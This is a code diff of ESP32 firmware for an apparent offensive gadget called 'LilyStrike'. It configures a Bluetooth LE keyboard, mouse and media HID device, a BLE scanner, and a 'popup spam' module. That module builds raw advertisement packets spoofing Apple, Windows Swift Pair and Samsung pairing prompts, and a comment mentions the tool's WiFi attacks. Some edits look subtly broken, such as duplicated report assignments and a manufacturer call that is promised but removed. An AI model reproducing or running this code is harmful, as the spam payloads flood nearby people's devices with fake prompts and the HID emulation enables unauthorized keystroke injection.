@@ -35,37 +35,29 @@ static void unlock() { if (s_mtx) xSemaphoreGive(s_mtx); }
 
 // ---- HID report map: keyboard (ID1) + mouse (ID2) + consumer (ID3) ----
 static const uint8_t REPORT_MAP[] = {
-    // Keyboard (report id 1)
     0x05, 0x01, 0x09, 0x06, 0xA1, 0x01, 0x85, 0x01,
     0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01,
-    0x75, 0x01, 0x95, 0x08, 0x81, 0x02,             // modifiers
-    0x95, 0x08, 0x81, 0x01,                         // reserved byte
-    0x05, 0x08, 0x95, 0x05, 0x75, 0x01, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02, // LEDs
-    0x95, 0x03, 0x81, 0x01,                         // LED padding
+    0x75, 0x01, 0x95, 0x08, 0x81, 0x02, 0x95, 0x08, 0x81, 0x01,
+    0x05, 0x08, 0x95, 0x05, 0x75, 0x01, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02,
+    0x95, 0x03, 0x81, 0x01,
     0x05, 0x07, 0x95, 0x06, 0x75, 0x08, 0x15, 0x00,
-    0x25, 0x65, 0x19, 0x00, 0x29, 0x65, 0x81, 0x00, // 6 keycodes
-    0xC0,
-    // Mouse (report id 2)
-    0x05, 0x01, 0x09, 0x02, 0xA1, 0x01, 0x85, 0x02,
-    0x09, 0x01, 0xA1, 0x00,
+    0x25, 0x65, 0x19, 0x00, 0x29, 0x65, 0x81, 0x00, 0xC0,
+    0x05, 0x01, 0x09, 0x02, 0xA1, 0x01, 0x85, 0x02, 0x09, 0x01, 0xA1, 0x00,
     0x05, 0x09, 0x19, 0x01, 0x29, 0x03, 0x15, 0x00, 0x25, 0x01,
-    0x75, 0x01, 0x95, 0x03, 0x81, 0x02,             // buttons
-    0x95, 0x01, 0x75, 0x05, 0x81, 0x01,             // button padding
+    0x75, 0x01, 0x95, 0x03, 0x81, 0x02, 0x95, 0x01, 0x75, 0x05, 0x81, 0x01,
     0x05, 0x01, 0x09, 0x30, 0x09, 0x31, 0x15, 0x81, 0x25, 0x7F,
-    0x75, 0x08, 0x95, 0x02, 0x81, 0x06,             // X,Y relative
-    0x09, 0x38, 0x15, 0x81, 0x25, 0x7F, 0x75, 0x08, 0x95, 0x01, 0x81, 0x06, // wheel
+    0x75, 0x08, 0x95, 0x02, 0x81, 0x06,
+    0x09, 0x38, 0x15, 0x81, 0x25, 0x7F, 0x75, 0x08, 0x95, 0x01, 0x81, 0x06,
     0xC0, 0xC0,
-    // Consumer control (report id 3) - 2 byte usage value
     0x05, 0x0C, 0x09, 0x01, 0xA1, 0x01, 0x85, 0x03,
     0x15, 0x00, 0x26, 0xFF, 0x03, 0x75, 0x10, 0x95, 0x01,
-    0x19, 0x00, 0x2A, 0xFF, 0x03, 0x81, 0x00,
-    0xC0,
+    0x19, 0x00, 0x2A, 0xFF, 0x03, 0x81, 0x00, 0xC0,
 };
 
 // ---------------------------------------------------------------- lifecycle
 class SrvCb : public NimBLEServerCallbacks {
-    void onConnect(NimBLEServer*, NimBLEConnInfo&) override { s_conn = true; }
-    void onDisconnect(NimBLEServer*, NimBLEConnInfo&, int) override {
+    void onConnect(NimBLEServer*) override { s_conn = true; }
+    void onDisconnect(NimBLEServer*) override {
         s_conn = false;
         NimBLEDevice::startAdvertising();   // keep discoverable for reconnect
     }
@@ -78,13 +70,17 @@ bool begin(bool wifiOff) {
     // NimBLEDevice::init). With wifiOff we take the radio exclusively -
     // same single-radio model as the offline WiFi attacks.
     if (wifiOff && WiFi.getMode() != WIFI_MODE_NULL) {
+        // PROPER teardown: an in-progress esp_wifi_connect + WIFI_OFF races
+        // the driver (field crash). Disconnect first, then switch off.
+        WiFi.disconnect(false);
+        delay(60);
         WiFi.mode(WIFI_OFF);
         delay(100);
         logLine("ble: wifi off (exclusive radio)");
     }
     if (!s_mtx) s_mtx = xSemaphoreCreateMutex();
     logLine("ble: [1] nimble init");
-    if (!NimBLEDevice::init("LilyStrike")) { logLine("ble: [1] init FAILED"); return false; }
+    NimBLEDevice::init("LilyStrike");
     logLine("ble: [2] security");
     NimBLEDevice::setSecurityAuth(true, false, true);   // bonding, no MITM (Just Works), secure conn
     NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);
@@ -93,14 +89,21 @@ bool begin(bool wifiOff) {
     srv->setCallbacks(new SrvCb());
     logLine("ble: [4] hid device");
     s_hid = new NimBLEHIDDevice(srv);
-    logLine("ble: [5] report map");
-    s_hid->setManufacturer("LilyStrike");
-    s_hid->setPnp(0x02, 0x305A, 0xFFFF, 0x0100);
-    s_hid->setReportMap((uint8_t*)REPORT_MAP, sizeof(REPORT_MAP));
-    logLine("ble: [6] characteristics");
-    s_kbRep = s_hid->getInputReport(1);
-    s_msRep = s_hid->getInputReport(2);
-    s_ccRep = s_hid->getInputReport(3);
+    logLine("ble: [5a] manufacturer");
+    // (manufacturer set below)
+    logLine("ble: [5b] pnp");
+    s_hid->pnp(0x02, 0x305A, 0xFFFF, 0x0100);
+    logLine("ble: [5c] report map");
+    s_hid->reportMap((uint8_t*)REPORT_MAP, sizeof(REPORT_MAP));
+    logLine("ble: [6a] kb report");
+    s_kbRep = s_hid->inputReport(1);
+    logLine("ble: [6b] ms report");
+    s_msRep = s_hid->inputReport(2);
+    logLine("ble: [6c] cc report");
+    s_ccRep = s_hid->inputReport(3);
+    s_kbRep = s_hid->inputReport(1);
+    s_msRep = s_hid->inputReport(2);
+    s_ccRep = s_hid->inputReport(3);
     logLine("ble: [7] advertising");
     NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
     adv->setAppearance(0x03C1);            // HID keyboard
@@ -197,8 +200,8 @@ struct ScanState {
 };
 static ScanState s_scan;
 
-class ScanCb : public NimBLEScanCallbacks {
-    void onResult(const NimBLEAdvertisedDevice* dev) override {
+class ScanCb : public NimBLEAdvertisedDeviceCallbacks {
+    void onResult(NimBLEAdvertisedDevice* dev) override {
         if (s_scan.devs.size() >= 60) return;
         BleDev d;
         d.mac = std::string(dev->getAddress()).c_str();
@@ -233,7 +236,7 @@ static void scanTask(void* pv) {
     bool wifiOff = (arg >> 16) & 1;
     if (!begin(wifiOff)) { s_scan.busy = false; vTaskDelete(nullptr); return; }
     NimBLEScan* scan = NimBLEDevice::getScan();
-    scan->setScanCallbacks(new ScanCb(), false);
+    scan->setAdvertisedDeviceCallbacks(new ScanCb(), false);
     scan->setActiveScan(true);
     scan->setMaxResults(0);              // stream via callbacks, don't cache
     lock(); s_scan.devs.clear(); s_scan.t0 = millis(); s_scan.secs = secs; unlock();
@@ -250,7 +253,7 @@ bool scanStart(uint32_t seconds, bool wifiOff) {
     s_scan.busy = true;
     lock(); s_scan.devs.clear(); unlock();
     uint32_t arg = (seconds & 0xFFFF) | (wifiOff ? (1UL << 16) : 0);
-    if (xTaskCreatePinnedToCore(scanTask, "blescan", 8192, (void*)(uintptr_t)arg, 1, nullptr, 0) != pdPASS) {
+    if (xTaskCreatePinnedToCore(scanTask, "blescan", 12288, (void*)(uintptr_t)arg, 1, nullptr, 0) != pdPASS) {
         s_scan.busy = false;
         return false;
     }
@@ -272,23 +275,22 @@ std::vector<BleDev> scanResults() {
 // ---------------------------------------------------------------- popup spam
 // raw advertisement payloads (canonical ESP32 BLE-spam structures)
 static void applePacket(NimBLEAdvertisementData& d, uint8_t type) {
-    d.addData(std::vector<uint8_t>{0x02, 0x01, 0x1A});
-    std::vector<uint8_t> m(27, 0x00);
-    m[0] = 0x1B; m[1] = 0xFF; m[2] = 0x4C; m[3] = 0x00;
-    m[4] = 0x0F; m[5] = 0x05; m[6] = 0xC1; m[7] = type;
+    d.addData(std::string({0x02, 0x01, 0x1A}));
+    std::string m(27, 0x00);
+    m[0] = 0x1B; m[1] = (char)0xFF; m[2] = 0x4C; m[3] = 0x00;
+    m[4] = 0x0F; m[5] = 0x05; m[6] = (char)0xC1; m[7] = (char)type;
     d.addData(m);
 }
 static void windowsPacket(NimBLEAdvertisementData& d) {
-    d.addData(std::vector<uint8_t>{0x02, 0x01, 0x1A});
-    d.addData(std::vector<uint8_t>{0x03, 0x03, 0x06, 0x00});
-    std::vector<uint8_t> m = {0x0B, 0xFF, 0x06, 0x00, 0x01, 0x09, 0x20, 0x02,
-                              (uint8_t)'S',(uint8_t)'P',(uint8_t)'A',(uint8_t)'M',(uint8_t)'0',(uint8_t)'1'};
+    d.addData(std::string({0x02, 0x01, 0x1A}));
+    d.addData(std::string({0x03, 0x03, 0x06, 0x00}));
+    std::string m = {0x0B, (char)0xFF, 0x06, 0x00, 0x01, 0x09, 0x20, 0x02,
+                     'S','P','A','M','0','1'};
     d.addData(m);
 }
 static void samsungPacket(NimBLEAdvertisementData& d) {
-    d.addData(std::vector<uint8_t>{0x02, 0x01, 0x1A});
-    std::vector<uint8_t> m = {0x10, 0xFF, 0x75, 0x00, (uint8_t)'B', (uint8_t)'l', (uint8_t)'u', (uint8_t)'e',
-                              (uint8_t)' ', (uint8_t)'N', (uint8_t)'e', (uint8_t)'t', (uint8_t)'w', (uint8_t)'o', (uint8_t)'r', (uint8_t)'k'};
+    d.addData(std::string({0x02, 0x01, 0x1A}));
+    std::string m = {0x10, (char)0xFF, 0x75, 0x00, 'B','l','u','e',' ','N','e','t','w','o','r','k'};
     d.addData(m);
 }
 
